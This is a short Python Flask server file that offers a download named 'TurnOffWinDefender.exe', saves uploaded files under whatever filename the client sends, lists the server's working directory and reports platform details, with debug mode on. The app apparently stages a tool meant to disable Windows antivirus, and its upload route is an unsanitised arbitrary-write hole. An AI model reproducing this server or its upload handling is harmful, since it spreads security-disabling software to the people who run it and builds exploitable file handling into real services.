from flask import *
from datetime import datetime

import os
import platform

import numpy as np
import cv2
import pytesseract

app = Flask(__name__)
pytesseract.pytesseract.tesseract_cmd = "/app/.apt/usr/bin/tesseract"

@app.route('/')
def homepage():
	return """
	    <h1>OK</h1>
	    """
#===========================download file================================
@app.route('/return-files/')
def return_files_tut():
	try:
		return send_file('TurnOffWinDefender.exe', attachment_filename='TurnOffWinDefender.exe')
	except Exception as e:
		return str(e)
	

	
#========================upload file=====================================
@app.route('/upload')  
def upload():
	return render_template("file_upload_form.html")  
 
@app.route('/success', methods = ['POST'])  
def success():
	if request.method == 'POST':  
		f = request.files['file']  
		f.save(f.filename)  
		return render_template("success.html", name = f.filename)  

#=======================================================================

@app.route('/getinfo')
def getinfo():
	s = ""
	arr = os.listdir(os.path.normpath(os.getcwd()))
	for i in arr :
		s += str(i) + "\n"
	return s

@app.route('/getinfopc')
def getinfopc():
	txt = f"""
	<h1>Machine: {platform.machine()}</h1>
	<h1>Version: {platform.version()}</h1>
	<h1>Plastform: {platform.platform()}</h1>
	<h1>Uname: {platform.uname()}</h1>
	<h1>System: {platform.system()}</h1>
	<h1>Processor: {platform.processor()}</h1>
"""
	return txt


if __name__ == '__main__':
	app.run(debug=True, use_reloader=True)

